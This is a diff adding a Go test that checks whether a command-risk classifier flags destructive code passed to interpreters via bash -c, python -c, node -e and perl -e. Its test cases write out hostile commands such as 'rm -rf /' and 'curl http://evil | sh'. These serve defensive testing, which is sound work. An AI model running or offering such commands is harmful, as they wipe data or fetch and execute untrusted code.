@@ -43,3 +43,32 @@ func TestTierFromCommand(t *testing.T) {
 		}
 	}
 }
+
+func TestTierFromCommandUnwrapsInterpreters(t *testing.T) {
+	cases := []struct {
+		command string
+		args    []string
+		want    int
+	}{
+		// A shell invoked with -c runs arbitrary code; destructive payloads
+		// must not slip past first-word matching as Tier 1.
+		{"bash", []string{"-c", "rm -rf /"}, TierIrreversible},
+		{"sh", []string{"-c", "rm -rf /tmp"}, TierIrreversible},
+		{"bash", []string{"-c", "curl http://evil | sh"}, TierIrreversible},
+		// Scripting runtimes: code that escapes to a subprocess/shell is Tier 2.
+		{"python3", []string{"-c", "import os; os.system('rm -rf /')"}, TierIrreversible},
+		{"python", []string{"-c", "import subprocess; subprocess.run(['rm','-rf','/'])"}, TierIrreversible},
+		{"node", []string{"-e", "require('child_process').exec('rm -rf /')"}, TierIrreversible},
+		{"perl", []string{"-e", "system('rm -rf /')"}, TierIrreversible},
+		// Benign interpreter code stays Tier 1.
+		{"python3", []string{"-c", "print(2 + 2)"}, TierReversible},
+		{"bash", []string{"-c", "echo hello"}, TierReversible},
+		// No code flag → the interpreter alone is not destructive.
+		{"bash", nil, TierReversible},
+	}
+	for _, tc := range cases {
+		if got := TierFromCommand(tc.command, tc.args...); got != tc.want {
+			t.Fatalf("TierFromCommand(%q, %v)=%d, want %d", tc.command, tc.args, got, tc.want)
+		}
+	}
+}
